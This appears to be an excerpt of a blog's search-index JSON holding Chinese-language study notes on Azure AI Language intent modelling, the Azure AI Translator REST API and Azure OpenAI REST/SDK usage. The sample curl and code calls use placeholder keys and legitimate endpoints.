当需要具有一组特定可能值（例如，一周中的几天）的实体时，列表实体非常有用。 可以在列表实体定义中包括同义词，以便可以定义包括“Sunday”、“Monday”、“Tuesday”等值的 DayOfWeek 实体；每个都有同义词，例如“Sun”、“Mon”、“Tue”等。 预生成的实体对于数字、日期/时间和名称等常见类型非常有用。 例如，添加预生成组件时，会自动检测“6”等值或“Microsoft”等组织。 有关受支持的预生成实体的列表，请参阅本文。 使用模式区分相似的言语 在某些情况下，模型可能包含多个意向，这些意向的言语可能相似。 可以使用语句模式来区分意向，同时最大限度地减少示例言语的数量。\n例如，考虑以下言语：\n“Turn on the kitchen light” “Is the kitchen light on?” “Turn off the kitchen light” 这些言语在语法上相似，但在单词或标点符号方面只有一些差异。 但是，它们表示三个不同的意向（分别为 TurnOnDevice、GetDeviceStatus 和 TurnOffDevice）。 此外，意向可应用于各种实体值。 除了“厨房灯”之外，意向还适用于“客厅灯”、“电视”或可能需要模型来提供支持的任何其他设备。\n若要正确训练模型，请提供一些指定不同格式言语的意向示例。\nTurnOnDevice： “Turn on the {DeviceName}” “在 {DeviceName} 上切换” “Turn the {DeviceName} on” GetDeviceStatus： “Is the {DeviceName} on[?]” TurnOffDevice： “Turn the {DeviceName} off” “Switch off the {DeviceName}” “Turn off the {DeviceName}” 在使用每种不同类型的言语来训练模型时，Azure AI 语言服务可以学习如何根据格式和标点正确地对意图进行分类。\n使用预生成的实体组件 可以通过定义所需的所有意向和语句来创建自己的语言模型，但通常可以使用预生成组件来检测常见实体，例如数字、电子邮件、URL 或选择。\n有关 Azure AI 语言服务可以检测的预生成实体的完整列表，请参阅受支持的预生成实体组件列表。\n使用预生成组件，可以让 Azure AI 语言服务自动检测指定类型的实体，且不必使用该实体的示例来训练模型。\n若要添加预生成组件，可以在项目中创建实体，然后选择该实体的“添加新预生成”以检测某些实体。\n每个实体最多可以包含 5 个预生成组件。 使用预生成模型元素可以显著减少开发对话语言理解解决方案所需的时间。\n训练、测试、发布和查看对话语言理解模型 创建模型是一个迭代过程，包括以下活动：\n训练模型以从示例言语中学习意向和实体。 以交互式方式或使用带有已知标签的测试数据集测试模型 将经过训练的模型部署到公共终结点以供客户端应用使用 查看预测并迭代访问语句以训练模型 通过遵循此迭代方法，你可以根据用户输入随着时间的推移而改进语言模型，从而帮助开发反映用户使用自然语言指示其意向的方式的解决方案。\n言语是指示特定意向的示例短语。 城市是应该应用意向（预订航班）的实体。 当语言模型需要检测公共实体时，请使用预生成组件让 Azure AI 语言服务自动检测实体。\n使用 Azure AI 翻译服务翻译文本 世界上有许多常用语言，在不同语言的发言人之间交换信息的功能通常是全球解决方案的关键要求。\nAzure AI 翻译提供了一个 API，用于在支持的 90 种语言之间翻译文本。\n完成此模块后，你将能够：\n预配 Azure AI 翻译资源 了解语言检测、翻译和音译 指定翻译选项 定义并运行自定义翻译\n预配 Azure AI 翻译资源 ​ Azure AI 翻译提供了多语言文本翻译 API，可用于： ​\n语言检测。 一对多翻译。 脚本音译（将本机脚本中的文本转换为替代脚本）。 ​ ​ 适用于 Azure AI 翻译的 Azure 资源 ​ 若要使用 Azure AI 翻译服务，必须在 Azure 订阅中为其预配资源。 可以预配单服务 Azure AI 翻译资源，也可以在多服务 Azure AI 服务资源中使用文本分析 API。 ​ 在 Azure 订阅中预配适当的资源后，可以使用部署资源的位置及其订阅密钥之一从代码中调用 Azure AI 翻译 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 API。 ​ 注意 ​ 本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。 ​\n了解语言检测、翻译和音译 让我们来探索 Azure AI 翻译的功能。 这些功能包括：\n语言检测 可使用 REST API 的 Detect 函数来检测编写文本所用的语言。\n例如，可使用 curl 将以下文本提交到 https://api.cognitive.microsofttranslator.com/detect?api-version=3.0 终结点。\n下面是要翻译的文本：\n{ \u0026#39;Text\u0026#39; : \u0026#39;こんにちは\u0026#39; } 下面是使用 curl 对终结点的调用，目的是检测文本的语言：\ncurl -X POST \u0026#34;https://api.cognitive.microsofttranslator.com/detect?api-version=3.0\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Region: \u0026lt;your-service-region\u0026gt;\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Key: \u0026lt;your-key\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;[{ \u0026#39;Text\u0026#39; : \u0026#39;こんにちは\u0026#39; }] 对此请求的响如下所示，表示文本使用日语编写：\n[ { \u0026#34;language\u0026#34;: \u0026#34;ja\u0026#34;, \u0026#34;score\u0026#34;: 1.0, \u0026#34;isTranslationSupported\u0026#34;: true, \u0026#34;isTransliterationSupported\u0026#34;: true } ] 翻译 若要将文本从一种语言翻译为另一种语言，请使用 Translate 函数；指定一个 from 参数来指示源语言，并指定一个或多个 to 参数，以指定文本翻译的目标语言。\n例如，你可以提交之前用于检测语言的相同 JSON，从而指定 ja（日语）的 from 参数以及值为 En（英语）和 fr（法语）的两个 to 参数。 为此，需要调用：\ncurl -X POST \u0026#34;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0\u0026amp;from=ja\u0026amp;to=fr\u0026amp;to=en\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Key: \u0026lt;your-key\u0026gt;\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Region: \u0026lt;your-service-region\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#34;[{ \u0026#39;Text\u0026#39; : \u0026#39;こんにちは\u0026#39; }]\u0026#34; 这将生成以下结果：\n[ {\u0026#34;translations\u0026#34;: [ {\u0026#34;text\u0026#34;: \u0026#34;Hello\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;en\u0026#34;}, {\u0026#34;text\u0026#34;: \u0026#34;Bonjour\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;fr\u0026#34;} ] } ] 音译 日语文本是使用平假名脚本编写的，因此，你可能想要将其翻译为不同的脚本，而不是将其翻译为不同的语言，例如，使用拉丁脚本（如英语语言文本所使用）呈现文本。\n为实现此目的，我们可以使用 Jpan 的 fromScript 参数和 Latn 的 toScript 参数将日语文本提交到 Transliterate 函数：\ncurl -X POST \u0026#34;https://api.cognitive.microsofttranslator.com/transliterate?api-version=3.0\u0026amp;fromScript=Jpan\u0026amp;toScript=Latn\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Key: \u0026lt;your-key\u0026gt;\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Region: \u0026lt;your-service-region\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;[{ \u0026#39;Text\u0026#39; : \u0026#39;こんにちは\u0026#39; }]\u0026#34; 响应会提供以下结果：\n[ { \u0026#34;script\u0026#34;: \u0026#34;Latn\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Kon\u0026#39;nichiwa\u0026#34; } ] 指定翻译选项 API 的 Translate 函数支持多个影响输出的参数。\n单词对齐方式 在书面英语（使用拉丁脚本）中，空格用于分隔单词。 但是，在某些其他语言（更具体地说，脚本）中，并非总是如此。\n例如，将“Smart Services”从 en（英语）翻译为 zh（简体中文）会生成结果“智能服务”，并且很难理解源文本中的字符与翻译中的相应字符之间的关系。 若要解决此问题，可以在调用中指定值为 true 的 includeAlignment 参数来生成以下结果：\n[ { \u0026#34;translations\u0026#34;:[ { \u0026#34;text\u0026#34;:\u0026#34;智能服务\u0026#34;, \u0026#34;to\u0026#34;:\u0026#34;zh-Hans\u0026#34;, \u0026#34;alignment\u0026#34;:{ \u0026#34;proj\u0026#34;:\u0026#34;0:4-0:1 6:13-2:3\u0026#34; } } ] } ] 这些结果告诉我们，源中的字符 0 到 4 对应于翻译中的字符 0 到 1，而源中的字符 6 到 13 对应于翻译中的字符 2 到 3。\n句子长度 有时，知道翻译长度可能会很有用，例如，确定如何在用户界面中以最佳方式显示它。 可以通过将 includeSentenceLength 参数设置为 true 来获取此信息。\n例如，在将英语 (en) 文本“Hello world”翻译成法语 (fr) 时指定此参数将产生以下结果：\n[ { \u0026#34;translations\u0026#34;:[ { \u0026#34;text\u0026#34;:\u0026#34;Salut tout le monde\u0026#34;, \u0026#34;to\u0026#34;:\u0026#34;fr\u0026#34;, \u0026#34;sentLen\u0026#34;:{\u0026#34;srcSentLen\u0026#34;:[12],\u0026#34;transSentLen\u0026#34;:[20]} } ] } ] 猥亵语言过滤 有时，文本包含猥亵语言，你可能希望在翻译中完全掩盖或省略它。 可以通过指定 profanityAction 参数来处理猥亵语言，该参数可以具有以下值之一：\nNoAction：猥亵语言与文本的其余部分一起翻译。 Deleted：翻译中省略了猥亵语言。 Marked：使用 profanityMarker 参数（如果提供）中所指示的方法来指示猥亵语言。 此参数的默认值为“Asterisk”，这会将猥亵语言中的字符替换为“*”。 作为替代方法，你可以将“标记”的值指定为 profanityMarker，这会将猥亵语言括在 XML 标记中。 例如，使用 Marked 的 profanityAction 和 Asterisk 的 profanityMarker 将英语 (en) 文本“JSON is ▇▇▇▇ great!”（其中，被挡住的单词是猥亵语言）翻译为德语 (de) 会产生以下结果：\n[ { \u0026#34;translations\u0026#34;:[ { \u0026#34;text\u0026#34;:\u0026#34;JSON ist *** erstaunlich.\u0026#34;, \u0026#34;to\u0026#34;:\u0026#34;de\u0026#34; } ] } ] 定义自定义翻译 Azure AI 翻译使用的默认翻译模型对于常规内容的翻译较有效，但你可能需要为使用专业术语词汇的企业或行业开发翻译解决方案，这就需要用到自定义翻译。\n若要解决此问题，可以创建用于映射自己的源和目标术语集进行翻译的自定义模型。 若要创建自定义模型，请使用自定义翻译工具门户来执行以下操作：\n创建工作区并链接到 Azure AI 翻译资源。 创建项目。 上传训练数据文件和训练模型。 测试模型和发布模型。 对 API 进行翻译调用。 将为自定义模型分配唯一的类别 ID（屏幕截图中突出显示），可以使用 category 参数在对 Azure AI 翻译资源的翻译调用中指定该 ID，从而使用自定义模型（而不是默认模型）执行翻译。\n如何调用 API 若要启动翻译，请将 POST 请求发送到以下请求 URL：\nhttps://api.cognitive.microsofttranslator.com/translate?api-version=3.0 请求需要包含几个参数：\napi-version：所需的 API 版本。 to：要翻译到的目标语言。 例如： 法语为 to=fr。 category：类别 ID。 请求还需要包含多个必需的标头：\nOcp-Apim-Subscription-Key。 客户端密钥的标头。 例如：Ocp-Apim-Subscription-Key=\u0026lt;your-client-key\u0026gt;。 Content-Type。 有效负载的内容类型。 要求的格式：Content-Type: application/json; charset=UTF-8。 请求正文应包含一个数组，该数组包含一个 JSON 对象，该对象具有用于指定要翻译的文本的 Text 属性：\n[ {\u0026#34;Text\u0026#34;:\u0026#34;Where can I find my employee details?\u0026#34;} ] 有多种不同方式可用于将请求发送到 API，包括使用 C#、Python 和 curl。 例如，若要进行快速调用，可以使用 curl 发送 POST 请求：\ncurl -X POST \u0026#34;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0\u0026amp;from=en\u0026amp;to=nl\u0026amp;category=\u0026lt;category-id\u0026gt;\u0026#34; -H \u0026#34;Ocp-Apim-Subscription-Key: \u0026lt;your-key\u0026#34; -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#34;[{\u0026#39;Text\u0026#39;:\u0026#39;Where can I find my employee details?\u0026#39;}]\u0026#34; 上述请求执行了一个将句子从英语翻译为荷兰语的调用。\n返回的响应 如果请求成功，响应返回响应代码 200。 还会返回包含已翻译文本的响应正文，如下所示：\n[ { \u0026#34;translations\u0026#34;:[ {\u0026#34;text\u0026#34;:\u0026#34;Waar vind ik mijn personeelsgegevens?\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;nl\u0026#34;} ] } ] 如果请求不成功，会根据错误类型返回不同的状态代码，例如 400（缺少或无效的查询参数）。 有关代码及其说明的完整列表，请参阅响应状态代码。\nhttps://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment\n","permalink":"https://qfsyso.github.io/posts/azure-openai-language/","summary":"使用 Azure AI 语言分析文本 每天，世界都会生成大量数据；大部分内容基于文本，其形式包括电子邮件、社交媒体文章、在线评论、业务文档等。 通过应用统计和语义模型的人工智能技术，可以创建从基于文本的数据中提取含义和见解的应用程序。\nAzure AI 语言为可轻松集成到你自己的应用程序代码中的常见文本分析技术提供 API。\n在本模块中，你将了解如何使用 Azure AI 语言执行以下操作：\n检测文本中的语言。 分析文本情绪。 提取关键短语、实体和链接实体。\n预配 Azure AI 语言资源 Azure AI 语言旨在帮助从文本中提取信息。 它提供可用于以下各项的功能：\n语言检测 - 确定编写文本所用的语言。\n关键短语提取 - 标识文本中指示要点的重要单词和短语。\n情绪分析 - 量化文本的正负面情绪程度。\n命名实体识别 - 检测对实体的引用，包括人员、位置、时间段、组织等。\n实体链接 - 通过提供指向维基百科文章的参考链接来标识特定实体。\n用于文本分析的 Azure 资源 若要使用 Azure AI 语言来分析文本，必须在 Azure 订阅中为其预配资源。\n在 Azure 订阅中预配适当的资源后，可以使用其终结点及其密钥之一从代码中调用 Azure AI 语言 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 Azure AI 语言 API。\n注意\n本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。","title":"Azure OpenAI Language"},{"content":"简介 Azure OpenAI 为开发人员提供了一个平台，用于在 Python 和 C# SDK 以及 REST API 的帮助下向其应用程序添加人工智能功能。 该平台提供了各种 AI 模型，每个模型都专用于不同的任务，这些任务可通过 Azure OpenAI 服务进行部署。\n本模块指导你了解如何将 Azure OpenAI 构建到自己的应用程序中，为你提供一个使用生成式 AI 开发解决方案的起点。\n将 Azure OpenAI 集成到应用中 Azure OpenAI 提供 C# 和 Python SDK 以及 REST API，开发人员可以用来向其应用程序添加 AI 功能。 Azure OpenAI 中的生成式 AI 功能通过模型提供。 Azure OpenAI 服务中可用的模型属于不同的系列，每个系列都有自己的重点。 若要使用这些模型之一，需要通过 Azure OpenAI 服务进行部署。\n重要\nAzure OpenAI 已发布，但支持负责任地使用该服务的访问权限有限。 用户需要先申请访问权限并获得批准，然后才能创建 Azure OpenAI 资源。\n创建 Azure OpenAI 资源 可以通过 Azure 命令行接口 (CLI) 和 Azure 门户部署 Azure OpenAI 资源。 通过 Azure 门户创建 Azure OpenAI 资源类似于部署单个 Azure AI 服务资源，并且是 Azure AI 服务的一部分。\n导航到 Azure 门户 搜索 Azure OpenAI，将其选中，然后单击“创建” 为空字段输入适当的值，然后创建资源。 目前 Azure OpenAI 可能部署的区域有限。 选择距离所在物理位置最近的区域。\n创建资源后，你将获得可在应用中使用的密钥和终结点。\n选择和部署模型 每个模型系列擅长不同的任务，并且每个系列中模型具有不同的功能。 模型系列分为三个主要系列：\n生成式预训练转换器 (GPT) - 能够理解和生成自然语言和某些代码的模型。 这些模型最适合常规任务、对话和聊天格式。 代码（gpt-3 及更早版本） - 代码模型基于 GPT 模型构建，并通过数百万行代码进行训练。 这些模型可以理解和生成代码，包括解释注释或自然语言以生成代码。 gpt-35-turbo 和更高版本的模型包含此代码功能，而无需单独的代码模型。 嵌入 - 这些模型可以理解和使用嵌入，这是机器学习模型和算法可以使用的特殊数据格式。 本模块重点介绍常规 GPT 模型，其他模块将介绍其他模型。\n对于较旧的模型，模型系列和功能会在基础模型的名称中有所体现：如 text-davinci-003，该名称指定它是一个文本模型，具有 davinci 级别的功能，并带有标识符 3。 有关模型、功能级别和命名约定的详细信息，请参阅 Azure OpenAI 模型文档页。\n较新的模型会指定第几代 gpt，以及它们是否为 turbo 版本，例如 gpt-35-turbo 表示 GPT 3.5 Turbo 模型。\n若要部署模型供你使用，请导航到 Azure OpenAI Studio 并转到“部署”页。 本模块后面的实验室详细介绍了如何执行此操作。\n已部署模型的身份验证和规范 在 Azure OpenAI 中部署模型时，选择一个部署名称来指定它。 配置应用时，需要指定资源终结点、密钥和部署名称，以指定要向其发送请求的部署模型。 这使你能够在同一资源中部署各种模型，并根据任务向相应的模型发出请求。\n提示设计 输入提示的写入方式在 AI 模型的响应方式中起着很大的作用。 例如，如果出现简单请求（如“什么是 Azure OpenAI”）的提示，通常会获得类似于使用搜索引擎的通用答案。\n但是，如果在你的答复中提供有关所需内容的详细信息，则会获得更具体的答案。 例如，假定出现以下提示：\nClassify the following news headline into 1 of the following categories: Business, Tech, Politics, Sport, Entertainment Headline 1: Donna Steffensen Is Cooking Up a New Kind of Perfection. The Internet’s most beloved cooking guru has a buzzy new book and a fresh new perspective Category: Entertainment Headline 2: Major Retailer Announces Plans to Close Over 100 Stores Category: 你可能会在标题下看到“类别:”，其中填写了“业务”。\n可以在 Azure OpenAI Studio Playground 中的“示例”下拉列表中找到与此类似的几个示例。 尽可能详细描述来自模型的响应中所需的内容，你可能会惊讶于它是多么有见地！\n注意\n无法大胆地假设来自 AI 模型的答案是事实或正确。 负责开发和部署 AI 系统的团队或个人应努力识别、衡量和减轻危害。 你有责任验证来自 AI 模型的任何响应，并负责任地使用 AI。 有关如何负责任地使用 Azure OpenAI 模型的进一步指南，请查看 Microsoft 关于 Azure OpenAI 的透明度说明。\n可在提示工程文档页中找到更多详细信息。\n可用的终结点 可以通过 REST API 或当前可用于 Python 和 C# 的 SDK 访问 Azure OpenAI。 可用于与已部署模型交互的终结点的使用方式不同，并且某些终结点只能使用某些模型。 可用的终结点包括：\n完成 - 模型接受一个输入提示，并生成一个或多个预测的完成。 你将在 studio 中看到此操场，但在本模块中不会深入讨论。 ChatCompletion - 模型接受聊天对话形式的输入（其中角色使用他们发送的消息指定），然后生成下一个聊天完成。 嵌入 - 模型接受输入并返回该输入的矢量表示形式。 例如，ChatCompletion 的输入是每条消息都有明确定义角色的会话：\n{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant, teaching people about AI.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Does Azure OpenAI support multiple languages?\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Yes, Azure OpenAI supports several languages, and can translate between them.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Do other Azure AI Services support translation too?\u0026#34;} 当你为 AI 模型提供一个真实的对话时，它可以生成具有更准确的语气、措辞和上下文的更好响应。 ChatCompletion 终结点通过发送与下一个用户消息的聊天历史记录，使 ChatGPT 模型能够进行更真实的对话。\nChatCompletion 还支持非聊天场景，例如摘要或实体提取。 可通过提供简短对话、指定系统信息和所需内容，并让用户输入信息来实现此操作。 例如，如果要生成工作描述，请向 ChatCompletion 提供类似于以下对话输入的内容。\n{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are an assistant designed to write intriguing job descriptions. \u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Write a job description for the following job title: \u0026#39;Business Intelligence Analyst\u0026#39;. It should include responsibilities, required qualifications, and highlight benefits like time off and flexible hours.\u0026#34;} 注意\nCompletion 适用于所有 gpt-3 生成模型，而 ChatCompletion 是 gpt-4 模型唯一支持的选项，并且是使用 gpt-35-turbo 模型时的首选终结点。 本模块中的实验将 gpt-35-turbo 与 ChatCompletion 终结点结合使用。\n使用 Azure OpenAI REST API Azure OpenAI 提供了一个 REST API 用于交互和生成响应，开发人员可以使用它将 AI 功能添加到其应用程序。 本单元介绍 API 的示例用法、输入和输出。\n注意\n在与 API 交互之前，必须在 Azure 门户中创建 Azure OpenAI 资源，在该资源中部署模型，并检索终结点和密钥。 请查看 Azure OpenAI 服务入门，了解如何执行此操作。\n每次调用 REST API 时，都需要 Azure OpenAI 资源的终结点和密钥，以及为部署的模型提供的名称。 在以下示例中，使用以下占位符：\n| 占位符名称 | 值 | | +++ | +++ | | YOUR_ENDPOINT_NAME | 此基本终结点位于 Azure 门户的“密钥和终结点”部分。 它是资源的基本终结点，例如 https://sample.openai.azure.com/。 | | YOUR_API_KEY | 密钥位于 Azure 门户的“密钥和终结点”部分。 可以在资源中使用任一密钥。 | | YOUR_DEPLOYMENT_NAME | 此部署名称是在 Azure OpenAI Studio 中部署模型时提供的名称。 |\n聊天完成 在 Azure OpenAI 资源中部署模型后，可以使用 POST 请求向服务发送提示。\ncurl https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/chat/completions?api-version=2023-03-15-preview \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -H \u0026#34;api-key: YOUR_API_KEY\u0026#34; \\ -d \u0026#39;{\u0026#34;messages\u0026#34;:[{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant, teaching people about AI.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Does Azure OpenAI support multiple languages?\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Yes, Azure OpenAI supports several languages, and can translate between them.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Do other Azure AI Services support translation too?\u0026#34;}]}\u0026#39; 来自 API 的响应将类似于以下 JSON：\n{ \u0026#34;id\u0026#34;: \u0026#34;chatcmpl-6v7mkQj980V1yBec6ETrKPRqFjNw9\u0026#34;, \u0026#34;object\u0026#34;: \u0026#34;chat.completion\u0026#34;, \u0026#34;created\u0026#34;: 1679001781, \u0026#34;model\u0026#34;: \u0026#34;gpt-35-turbo\u0026#34;, \u0026#34;usage\u0026#34;: { \u0026#34;prompt_tokens\u0026#34;: 95, \u0026#34;completion_tokens\u0026#34;: 84, \u0026#34;total_tokens\u0026#34;: 179 }, \u0026#34;choices\u0026#34;: [ { \u0026#34;message\u0026#34;: { \u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Yes, other Azure AI Services also support translation. Azure AI Services offer translation between multiple languages for text, documents, or custom translation through Azure AI Services Translator.\u0026#34; }, \u0026#34;finish_reason\u0026#34;: \u0026#34;stop\u0026#34;, \u0026#34;index\u0026#34;: 0 } ] } REST 终结点允许指定其他可选输入参数，如 temperature 和 max_tokens 等。 如果要在请求中包含任何这些参数，请根据请求将它们添加到输入数据中。\n嵌入 嵌入对机器学习模型轻松使用的特定格式很有帮助。 若要从输入文本生成嵌入，请向 embeddings 终结点发出 POST 请求。\ncurl https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/embeddings?api-version=2022-12-01 \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -H \u0026#34;api-key: YOUR_API_KEY\u0026#34; \\ -d \u0026#34;{\\\u0026#34;input\\\u0026#34;: \\\u0026#34;The food was delicious and the waiter...\\\u0026#34;}\u0026#34; 生成嵌入时，请确保在 Azure OpenAI 中使用用于嵌入的模型。 这些模型以 text-embedding 或 text-similarity 开头，具体取决于你要查找的功能。\n来自 API 的响应将类似于以下 JSON：\n{ \u0026#34;object\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;data\u0026#34;: [ { \u0026#34;object\u0026#34;: \u0026#34;embedding\u0026#34;, \u0026#34;embedding\u0026#34;: [ 0.0172990688066482523, -0.0291879814639389515, .... 0.0134544348834753042, ], \u0026#34;index\u0026#34;: 0 } ], \u0026#34;model\u0026#34;: \u0026#34;text-embedding-ada:002\u0026#34; } 使用 Azure OpenAI SDK 除了上一单元中介绍的 REST API 外，用户还可以通过 C# 和 Python SDK 访问 Azure OpenAI 模型。 通过 REST 和这些 SDK 提供相同的功能。\n注意\n在使用任一 SDK 与 API 交互之前，必须在 Azure 门户中创建 Azure OpenAI 资源，在该资源中部署模型，并检索终结点和密钥。 请查看 Azure OpenAI 服务入门，了解如何执行此操作。\n对于本单元中介绍的 SDK，需要 Azure OpenAI 资源的终结点和密钥，以及为部署的模型提供的名称。 在以下代码片段中，使用以下占位符：\n| 占位符名称 | 值 | | +++ | +++ | | YOUR_ENDPOINT_NAME | 此基本终结点位于 Azure 门户的“密钥和终结点”部分。 它是资源的基本终结点，例如 https://sample.openai.azure.com/。 | | YOUR_API_KEY | 密钥位于 Azure 门户的“密钥和终结点”部分。 可以在资源中使用任一密钥。 | | YOUR_DEPLOYMENT_NAME | 此部署名称是在 Azure OpenAI Studio 中部署模型时提供的名称。 |\n安装库 首先，安装首选语言的客户端库。 C# SDK 是 REST API 的 .NET 适应，专为 Azure OpenAI 而构建，但它可用于连接到 Azure OpenAI 资源或非 Azure OpenAI 终结点。 Python SDK 由 OpenAI 生成和维护。\ndotnet add package Azure.AI.OpenAI --prerelease 配置应用以访问 Azure OpenAI 资源 每种语言的配置略有不同，但两种语言都需要设置相同的参数。 必需的参数是 endpoint、key 和部署的名称，当向模型发送提示时，部署的名称被称为 engine。\n将库添加到应用，并为客户端设置所需的参数。\n// Add OpenAI library using Azure.AI.OpenAI; // Define parameters and initialize the client string endpoint = \u0026#34;\u0026lt;YOUR_ENDPOINT_NAME\u0026gt;\u0026#34;; string key = \u0026#34;\u0026lt;YOUR_API_KEY\u0026gt;\u0026#34;; string deploymentName = \u0026#34;\u0026lt;YOUR_DEPLOYMENT_NAME\u0026gt;\u0026#34;; OpenAIClient client = new OpenAIClient(new Uri(endpoint), new AzureKeyCredential(key)); # Add OpenAI library from openai import AzureOpenAI deployment_name = \u0026#39;\u0026lt;YOUR_DEPLOYMENT_NAME\u0026gt;\u0026#39; # Initialize the Azure OpenAI client client = AzureOpenAI( azure_endpoint = \u0026#39;\u0026lt;YOUR_ENDPOINT_NAME\u0026gt;\u0026#39;, api_key=\u0026#39;\u0026lt;YOUR_API_KEY\u0026gt;\u0026#39;, api_version=\u0026#34;20xx-xx-xx\u0026#34; # Target version of the API, such as 2024-02-15-preview ) 调用 Azure OpenAI 资源 配置与 Azure OpenAI 的连接后，将提示发送给模型。\n// Build completion options object ChatCompletionsOptions chatCompletionsOptions = new ChatCompletionsOptions() { Messages = { new ChatRequestSystemMessage(\u0026#34;You are a helpful AI bot.\u0026#34;), new ChatRequestUserMessage(\u0026#34;What is Azure OpenAI?\u0026#34;), }, DeploymentName = deploymentName }; // Send request to Azure OpenAI model ChatCompletions response = client.GetChatCompletions(chatCompletionsOptions); // Print the response string completion = response.Choices[0].Message.Content; Console.WriteLine(\u0026#34;Response: \u0026#34; + completion + \u0026#34;\\n\u0026#34;); response = client.chat.completions.create( model=deployment_name, messages=[ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;What is Azure OpenAI?\u0026#34;} ] ) generated_text = response.choices[0].message.content # Print the response print(\u0026#34;Response: \u0026#34; + generated_text + \u0026#34;\\n\u0026#34;) 响应对象包含多个值，例如 total_tokens 和 finish_reason。 响应对象的完成类似于以下完成：\n\u0026#34;Azure OpenAI is a cloud-based artificial intelligence (AI) service that offers a range of tools and services for developing and deploying AI applications. Azure OpenAI provides a variety of services for training and deploying machine learning models, including a managed service for training and deploying deep learning models, a managed service for deploying machine learning models, and a managed service for managing and deploying machine learning models.\u0026#34; 在 C# 和 Python 中，调用可以包含可选参数，其中包括 temperature 和 max_tokens。 本模块的实验室中包含了使用这些参数的示例。\n向 Azure OpenAI 资源发出请求需要哪些资源值？ 密钥、终结点和部署名称 哪三个终结点可用于与已部署的 Azure OpenAI 模型交互？ Completion、ChatCompletion 和 Embeddings 哪一个是 Azure OpenAI 中为会话的下一个 Completion 建模的最佳可用终结点？ ChatCompletion\n来自\nhttps://learn.microsoft.com/zh-cn/collections/e6kjarx0q38?WT.mc_id=cloudskillschallenge_0bc0dea3-e83b-44f1-99a1-f91a1c041817\n","permalink":"https://qfsyso.github.io/posts/azure-openai-natural-language/","summary":"简介 Azure OpenAI 为开发人员提供了一个平台，用于在 Python 和 C# SDK 以及 REST API 的帮助下向其应用程序添加人工智能功能。 该平台提供了各种 AI 模型，每个模型都专用于不同的任务，这些任务可通过 Azure OpenAI 服务进行部署。\n本模块指导你了解如何将 Azure OpenAI 构建到自己的应用程序中，为你提供一个使用生成式 AI 开发解决方案的起点。\n将 Azure OpenAI 集成到应用中 Azure OpenAI 提供 C# 和 Python SDK 以及 REST API，开发人员可以用来向其应用程序添加 AI 功能。 Azure OpenAI 中的生成式 AI 功能通过模型提供。 Azure OpenAI 服务中可用的模型属于不同的系列，每个系列都有自己的重点。 若要使用这些模型之一，需要通过 Azure OpenAI 服务进行部署。\n重要\nAzure OpenAI 已发布，但支持负责任地使用该服务的访问权限有限。 用户需要先申请访问权限并获得批准，然后才能创建 Azure OpenAI 资源。\n创建 Azure OpenAI 资源 可以通过 Azure 命令行接口 (CLI) 和 Azure 门户部署 Azure OpenAI 资源。 通过 Azure 门户创建 Azure OpenAI 资源类似于部署单个 Azure AI 